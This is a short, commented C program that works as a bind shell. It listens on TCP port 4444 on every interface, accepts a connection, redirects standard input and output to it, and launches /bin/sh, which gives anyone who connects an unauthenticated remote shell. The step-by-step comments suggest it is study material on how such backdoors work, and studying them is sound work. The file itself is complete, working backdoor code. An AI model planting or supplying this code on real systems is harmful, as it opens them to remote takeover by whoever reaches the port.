#include <stdio.h>
#include <netinet/in.h>
#define PORT 4444

int main(int argc, char **argv) {
  // Create a socket
  int lsock = socket(AF_INET, SOCK_STREAM, 0);

  // Setup servr side config struct
  // We configure:
  // The family:IPv4
  // The interface: 0.0.0.0 (any)
  // The port: port#
  struct sockaddr_in config;
  config.sin_family = AF_INET;
  config.sin_addr.s_addr = INADDR_ANY;
  // The htons() function converts the
  // unsigned short integer hostshort from host byte
  // order to network byte order.
  config.sin_port = htons(PORT);

  // Bind the created socket with the interface
  // specified in the configuration
  bind(lsock, (struct sockaddr *)&config, sizeof(config));

  // Listen on the socket
  listen(lsock, 0);

  // Accept the incoming connection
  int csock = accept(lsock, NULL, NULL);

  // Redirect stdin, stdout, and stderror
  dup2(csock, 0);
  dup2(csock, 1);
  dup2(csock, 2);

  // Execute a shell
  execve("/bin/sh", NULL, NULL);
};
